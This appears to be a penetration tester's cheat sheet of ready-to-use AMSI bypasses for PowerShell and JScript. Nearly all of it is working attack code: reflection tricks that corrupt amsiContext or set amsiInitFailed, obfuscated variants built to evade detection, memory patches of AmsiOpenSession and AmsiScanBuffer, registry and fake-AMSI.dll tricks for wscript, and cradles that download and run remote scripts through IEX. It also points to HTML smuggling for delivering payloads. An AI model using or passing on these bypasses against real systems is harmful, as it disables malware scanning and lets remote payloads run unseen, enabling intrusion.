- AMSI allows runtime inspection of all PowerShell/JScript/VBscript/VBA/.NET - loads AMSI.dll
- A bypass is needed if launching an .exe from PS - not from cmd!
- **https://amsi.fail**

### PowerShell

    //Reliable:
        (new-object system.net.webclient).downloadstring('http://192.168.45.158/amsi.txt') | IEX
        $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)


    //Prepended Bypass Example:
        powershell "$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344);IEX (new-object system.net.webclient).downloadstring('http://192.168.56.1:9000/sc.txt')"

    //Another Example:
        [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)


    /////BREAKING LOGIC/////
    ***Method 1: Overwriting AMSI Header to Crash it (corrupting the context structure):
        $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
        
        //test: 'amsiutils'

    **Method 2: Set amsiInitFailed:
        $a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
        
        //Obfuscated:  $A="5492868772801748688168747280728187173688878280688776";$B="8281173680867656877679866880867644817687416876797271";function C($n, $m){[string]($n..$m|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " "};$k=C 0 37;$r=C 38 51;$a=[Ref].Assembly.GetType($k);$a.GetField($r,'NonPublic,Static').SetValue($null,$true)
        
        //Another:  sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

    /////////////////////
    //////BINARY PATCHING//////
    ///Patch AmsiOpenSession:
    function lookupFunc {
        Param ($moduleName, $funcName)

        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $tmp = @()
        $assem.GetMethods() | % {If($_.Name -eq "GetProcAddress") {$tmp += $_}}
        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $funcName))
    }

    function getDelegateType {
        Param (
            [Parameter(Position=0, Mandatory=$True)][Type[]] $argsTypes,
            [Parameter(Position=1)][Type] $retType = [Void]
        )

        $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $argsTypes).SetImplementationFlags('Runtime, Managed')
        $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argsTypes).SetImplementationFlags('Runtime, Managed')
        return $type.CreateType()
    }

    [IntPtr]$funcAddr = lookupFunc amsi.dll ("Ams"+"iO"+"pen"+"Ses"+"sion")
    $oldProtection = 0
    $vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType()) ([Bool])))
    $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtection)
    $buf = [Byte[]] (0x48, 0x31, 0xC0)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
    $vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtection)


    /////////////
    ///Patch AmsiScanBuffer:
    function lookupFunc {
        Param ($moduleName, $funcName)

        $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
        $tmp = @()
        $assem.GetMethods() | % {If($_.Name -eq 'GetProcAddress') {$tmp += $_}}
        return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $funcName))
    }

    function getDelegateType {
        Param (
            [Parameter(Position=0, Mandatory=$True)][Type[]] $argsTypes,
            [Parameter(Position=1)][Type] $retType = [Void]
        )

        $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $argsTypes).SetImplementationFlags('Runtime, Managed')
        $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argsTypes).SetImplementationFlags('Runtime, Managed')
        return $type.CreateType()
    }

    [IntPtr]$asb = lookupFunc amsi.dll ("Ams"+"iS"+"can"+"Buf"+"fer")
    $oldProtect = 0
    $vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
    $vp.Invoke($asb, [uint32]6, 0x40, [ref]$oldProtect)
    $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $asb, 6)
    $vp.Invoke($asb, [uint32]6, 0x20, [ref]$oldProtect)

### JScript

    #########Method 1: Bypass by Setting Reg Key:#########
    **key must be set before wscript.exe is started
    //from .js:
        var sh = new ActiveXObject('WScript.Shell');
        var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
        sh.RegWrite(key, 0, "REG_DWORD");
        
    ***Prepend to the DotNetToJScript-generated runner to bypass AMSI:

    var sh = new ActiveXObject('WScript.Shell');
    var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
    try{
    var AmsiEnable = sh.RegRead(key);
    if(AmsiEnable!=0){
    throw new Error(1, '');
    }
    }catch(e){
    sh.RegWrite(key, 0, "REG_DWORD");
    sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
    sh.RegWrite(key, 1, "REG_DWORD");
    WScript.Quit(1);
    }


    #########Method 2: Bypass by Creating Fake Amsi.dll:#########
    **Ensure to delete C:\Windows\Tasks\AMSI.dll (and alter the UAC key) before re-running
    //Defender will detect the amsi.dll process, but it will still work

    //Prepend to top of .js code:
        
    var filesys= new ActiveXObject("Scripting.FileSystemObject");
    var sh = new ActiveXObject('WScript.Shell');
    try
    {
    if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
    {
    throw new Error(1, '');
    }
    }
    catch(e)
    {
    filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
    sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
    WScript.Quit(1);
    }


    //////////////////////

    DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o Hollow.js

    //other reg key for vbscript, etc. - ex. HKLM\SOFTWARE\Classes\CLSID\{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}\InprocServer32

    **Can also use .exe or .js with HTML Smuggling Template
        Options: directly download the file and hope user starts, or just download it and then use Demiguise to run it (or use Demiguise to run over SMB)
